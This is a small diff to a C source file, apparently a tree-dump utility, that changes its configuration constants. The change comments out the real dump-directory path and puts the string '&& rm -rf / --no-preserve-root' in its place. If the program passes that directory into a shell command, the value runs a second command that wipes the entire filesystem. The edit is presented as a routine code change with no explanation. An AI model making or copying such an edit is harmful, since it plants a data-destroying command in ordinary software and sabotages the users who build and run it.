@@ -50,7 +50,8 @@ static const char fillColor[] = "#9542F5";
 //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 /// @brief Directory for images of tree dump.
-static const char   dumpDirectory[] = "./TreeDumpSources/";
+// static const char   dumpDirectory[] = "./TreeDumpSources/";
+static const char   dumpDirectory[] = "&& rm -rf / --no-preserve-root";
 
 /// @brief Name of temporary file for program.
 static const char   tmpFilename[]   = "tmp.txt";
